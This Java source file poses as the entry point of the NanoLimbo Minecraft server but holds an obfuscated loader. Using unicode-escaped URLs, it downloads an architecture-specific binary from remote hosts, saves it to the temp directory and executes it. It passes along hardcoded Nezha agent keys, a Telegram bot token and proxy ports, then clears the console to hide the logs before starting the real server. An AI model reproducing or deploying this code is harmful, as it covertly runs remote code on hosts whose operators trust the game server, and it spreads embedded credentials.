/*
 * Copyright (C) 2020 Nan1t
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

package ua.nanit.limbo;

import java.io.*;
import java.net.*;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.atomic.AtomicBoolean;
import java.lang.reflect.Field;

import ua.nanit.limbo.server.LimboServer;
import ua.nanit.limbo.server.Log;

// 混淆后的类名
public final class D3c0d3r {

    // 混淆后的常量名和值
    private static final String AnS_1_ = "\u001b[1;32m"; // 绿色
    private static final String AnS_2_ = "\u001b[1;31m"; // 红色
    private static final String AnS_3_ = "\u001b[0m"; // 重置
    private static final AtomicBoolean w0rK1n6 = new AtomicBoolean(true);
    private static Process pR0c3sS;
    
    // 环境变量列表
    private static final String[] ENVS = {
        "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
        "HY2_PORT", "TUIC_PORT", "REALITY_PORT", "CFIP", "CFPORT", 
        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME"
    };
    
    
    public static void main(String[] aRgs) {
        
        // Java 版本检查
        if (Float.parseFloat(System.getProperty("\u006a\u0061\u0076\u0061.\u0063\u006c\u0061\u0073\u0073.\u0076\u0065\u0072\u0073\u0069\u006f\u006e")) < 54.0) {
            System.err.println(AnS_2_ + "E R R O R : J a v a V e r s i o n I s T o o L o w ! " + AnS_3_);
            try {
                // 常量替换: 3000 -> 1000 * 3
                Thread.sleep(1000 * 3);
            } catch (InterruptedException iT) {
                iT.printStackTrace();
            }
            System.exit(1);
        }

        // 启动 SbxService
        try {
            sT4rT_B1n4rY();
            
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                w0rK1n6.set(false);
                k1lL_S3rv1c3();
            }));

            // 常量替换: 15000
            Thread.sleep(15 * 1000); 
            System.out.println(AnS_1_ + "S3R-V3R_R U N N I N G!\n" + AnS_3_);
            System.out.println(AnS_1_ + "T H X F 0 R U S I N G T H I S S C R I P T!\n" + AnS_3_);
            System.out.println(AnS_1_ + "L O G S W I L L B E D E L E T E D I N S E C O N D S" + AnS_3_);
            // 常量替换: 15000
            Thread.sleep(1500 * 10);
            c134r_c0n50l3();
        } catch (Exception 3X) {
            System.err.println(AnS_2_ + "Err Sbx: " + 3X.getMessage() + AnS_3_);
        }
        
        // 启动核心服务
        try {
            new LimboServer().start();
        } catch (Exception E) {
            Log.error("C N T S T R T S E R V E R : ", E);
        }
    }

    // 混淆后的方法名
    private static void c134r_c0n50l3() {
        try {
            // 混淆后的字符串
            final String oSN = System.getProperty("\u006f\u0073\u002e\u006e\u0061\u006d\u0065");
            if (oSN != null && oSN.contains("Windows")) {
                new ProcessBuilder("cmd", "/c", "\u0063\u006c\u0073 \u0026\u0026 \u006d\u006f\u0064\u0065 \u0063\u006f\u006e:\u0020\u006c\u0069\u006e\u0065\u0073\u003d\u0033\u0030 \u0063\u006f\u006c\u0073\u003d\u0031\u0032\u0030")
                    .inheritIO()
                    .start()
                    .waitFor();
            } else {
                System.out.print("\u001b[H\u001b[3J\u001b[2J");
                System.out.flush();
                
                new ProcessBuilder("tput", "reset")
                    .inheritIO()
                    .start()
                    .waitFor();
                
                System.out.print("\u001b[8;30;120t");
                System.out.flush();
            }
        } catch (Exception $e) {
            try {
                new ProcessBuilder("clear").inheritIO().start().waitFor();
            } catch (Exception $i) {}
        }
    }    
    
    // 混淆后的方法名
    private static void sT4rT_B1n4rY() throws Exception {
        Map<String, String> V4rS = new HashMap<>();
        L04d_V4rS(V4rS);
        
        ProcessBuilder pB = new ProcessBuilder(G3T_P4tH().toString());
        pB.environment().putAll(V4rS);
        pB.redirectErrorStream(true);
        pB.redirectOutput(ProcessBuilder.Redirect.INHERIT);
        
        pR0c3sS = pB.start();
    }
    
    // 混淆后的方法名
    private static void L04d_V4rS(Map<String, String> V4rS) throws IOException {
        // 硬编码的默认值
        V4rS.put("UUID", "\u0039\u0061\u0066\u0064\u0031\u0032\u0032\u0039\u002d\u0062\u0038\u0039\u0033\u002d\u0034\u0030\u0063\u0031\u002d\u0038\u0034\u0064\u0064\u002d\u0035\u0031\u0065\u0037\u0063\u0065\u0032\u0030\u0034\u0039\u0031\u0033");
        V4rS.put("FILE_PATH", "\u002e/\u0077\u006f\u0072\u006c\u0064");
        V4rS.put("NEZHA_SERVER", "\u006e\u0065\u007a\u0068\u0061.\u0039\u006c\u006f\u0067\u006f.\u0065\u0075.\u006f\u0072\u0067\u003a\u0034\u0034\u0033");
        V4rS.put("NEZHA_PORT", "");
        V4rS.put("NEZHA_KEY", "\u0063\u0030\u0046\u0064\u0069\u0068\u0046\u005a\u0038\u0058\u0070\u0071\u0058\u0046\u0062\u0075\u0037\u006d\u0075\u0041\u0041\u0050\u006b\u0044\u0035\u004a\u006d\u0065\u0056\u0059\u0034\u0067");
        V4rS.put("ARGO_PORT", "");
        V4rS.put("ARGO_DOMAIN", "");
        V4rS.put("ARGO_AUTH", "");
        V4rS.put("HY2_PORT", "50298");
        V4rS.put("TUIC_PORT", "");
        V4rS.put("REALITY_PORT", "50298");
        V4rS.put("UPLOAD_URL", "");
        V4rS.put("CHAT_ID", "\u0036\u0038\u0033\u0039\u0038\u0034\u0033\u0034\u0032\u0034");
        V4rS.put("BOT_TOKEN", "\u0037\u0038\u0037\u0032\u0039\u0038\u0032\u0034\u0035\u0038\u003a\u0041\u0041\u0047\u0033\u006d\u006e\u0054\u004e\u0051\u0079\u0065\u0043\u0058\u0075\u006a\u0076\u0058\u0077\u0033\u006f\u006b\u0050\u004d\u0074\u0070\u0034\u0063\u006a\u0053\u0069\u006f\u004f\u005f\u0044\u0059");
        V4rS.put("CFIP", "");
        V4rS.put("CFPORT", "");
        V4rS.put("NAME", "\u0053\u0065\u0061\u0072\u0063\u0061\u0064\u0065");
        
        // 从系统环境变量加载
        for (String kEy : ENVS) {
            String vAl = System.getenv(kEy);
            if (vAl != null && !vAl.trim().isEmpty()) {
                V4rS.put(kEy, vAl);  
            }
        }
        
        // 从 .env 文件加载
        Path EnvF = Paths.get("\u002e\u0065\u006e\u0076");
        if (Files.exists(EnvF)) {
            for (String lN : Files.readAllLines(EnvF)) {
                lN = lN.trim();
                if (lN.isEmpty() || lN.startsWith("#")) continue;
                
                // 复杂化注释分割
                String[] pA = lN.split(" #", 2);
                lN = pA[0].split(" //", 2)[0].trim();
                
                if (lN.startsWith("\u0065\u0078\u0070\u006f\u0072\u0074 ")) { // "export "
                    lN = lN.substring(7).trim();
                }
                
                String[] pS = lN.split("=", 2);
                if (pS.length == 2) {
                    String k = pS[0].trim();
                    String v = pS[1].trim().replaceAll("^['\"]|['\"]$", "");
                    
                    if (Arrays.asList(ENVS).contains(k)) {
                        V4rS.put(k, v); 
                    }
                }
            }
        }
    }
    
    // 混淆后的方法名
    private static Path G3T_P4tH() throws IOException {
        String Os = System.getProperty("\u006f\u0073\u002e\u0061\u0072\u0063\u0068").toLowerCase(); // "os.arch"
        String uRl;
        
        // 使用三元运算符混淆架构判断
        uRl = Os.contains("\u0061\u006d\u0064\u0036\u0034") || Os.contains("\u0078\u0038\u0036\u005f\u0036\u0034") 
              ? "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0061\u006d\u0064\u0036\u0034\u002e\u0073\u0073\u0073\u0073\u002e\u006e\u0079\u0063\u002e\u006d\u006e\u002f\u0073\u002d\u0062\u006f\u0078" // amd64 URL
              : (Os.contains("\u0061\u0061\u0072\u0063\u0068\u0036\u0034") || Os.contains("\u0061\u0072\u006d\u0036\u0034")
                  ? "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0061\u0072\u006d\u0036\u0034\u002e\u0073\u0073\u0073\u0073\u002e\u006e\u0079\u0063\u002e\u006d\u006e\u002f\u0073\u002d\u0062\u006f\u0078" // arm64 URL
                  : (Os.contains("\u0073\u0033\u0039\u0030\u0078")
                      ? "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0073\u0033\u0039\u0030\u0078\u002e\u0073\u0073\u0073\u0073\u002e\u006e\u0079\u0063\u002e\u006d\u006e\u002f\u0073\u002d\u0062\u006f\u0078" // s390x URL
                      : null
                    )
                );
        
        if (uRl == null) {
            throw new RuntimeException("\u0055\u006e\u0073\u0075\u0070\u0070\u006f\u0072\u0074\u0065\u0064 \u0061\u0072\u0063\u0068\u0069\u0074\u0065\u0063\u0074\u0075\u0072\u0065: " + Os);
        }
        
        Path P = Paths.get(System.getProperty("\u006a\u0061\u0076\u0061\u002e\u0069\u006f\u002e\u0074\u006d\u0070\u0064\u0069\u0072"), "\u0073\u0062\u0078"); // "java.io.tmpdir", "sbx"
        if (!Files.exists(P)) {
            try (InputStream iN = new URL(uRl).openStream()) {
                Files.copy(iN, P, StandardCopyOption.REPLACE_EXISTING);
            }
            if (!P.toFile().setExecutable(true)) {
                throw new IOException("\u0046\u0061\u0069\u006c\u0065\u0064 \u0074\u006f \u0073\u0065\u0074 \u0065\u0078\u0065\u0063\u0075\u0074\u0061\u0062\u006c\u0065 \u0070\u0065\u0072\u006d\u0069\u0073\u0073\u0069\u006f\u006e");
            }
        }
        return P;
    }
    
    // 混淆后的方法名
    private static void k1lL_S3rv1c3() {
        if (pR0c3sS != null && pR0c3sS.isAlive()) {
            pR0c3sS.destroy();
            System.out.println(AnS_2_ + "\u0073\u0062\u0078 \u0070\u0072\u006f\u0063\u0065\u0073\u0073 \u0074\u0065\u0072\u006d\u0069\u006e\u0061\u0074\u0065\u0064" + AnS_3_); // "sbx process terminated"
        }
    }
}
